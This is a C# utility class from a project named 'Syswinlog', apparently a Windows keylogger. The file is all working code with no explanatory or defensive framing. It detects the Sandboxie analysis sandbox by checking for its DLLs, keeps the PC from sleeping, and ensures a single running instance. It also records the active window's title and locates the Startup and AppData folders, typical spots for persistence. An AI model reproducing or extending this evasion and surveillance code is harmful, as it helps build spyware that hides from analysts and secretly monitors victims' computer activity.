using System;
using System.Text;
using System.Net;
using Syswinlog.Classes.NativeMethods;
using System.Text.RegularExpressions;
using System.Diagnostics;

class Utils
{
    public static bool DetectSandboxie()
    {
        string[] sandboxList = new string[] {
            "cmdvrt32.dll",
            "SxIn.dll",
            "SbieDll.dll"
        };
        foreach ( var sbox in sandboxList ) {
            if( NativeMethods.GetModuleHandle(sbox).ToInt32() != 0 ) {
                return true;
            }
        }
        return false;
    }

    public static bool IsInstanceRunning()
    {
        Process[] procList = Process.GetProcessesByName(Process.GetCurrentProcess().ProcessName);
        if( procList.Length > 1 ) {
            return true;
        } else {
            return false;
        }
    }

    public static void PreventSleep()
    {
        try {
            NativeMethods.SetThreadExecutionState(
                NativeMethods.EXECUTION_STATE.ES_SYSTEM_REQUIRED |
                NativeMethods.EXECUTION_STATE.ES_CONTINUOUS |
                NativeMethods.EXECUTION_STATE.ES_DISPLAY_REQUIRED);
        }
        catch { }
    }

    public static StringBuilder GetActiveWindowTitle()
    {
        const int nChars = 255;
        StringBuilder sb = new StringBuilder(nChars);
        if (NativeMethods.GetWindowText(NativeMethods.GetForegroundWindow(), sb, nChars) > 0) {
            return sb;
        } else {
            sb.Append("???");
            return sb;
        }
    }

    public static string GetStartupDirectory() {
        return Environment.GetFolderPath(Environment.SpecialFolder.Startup);
    }

    public static string GetAppDataFolder() {
        return Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
    }
}
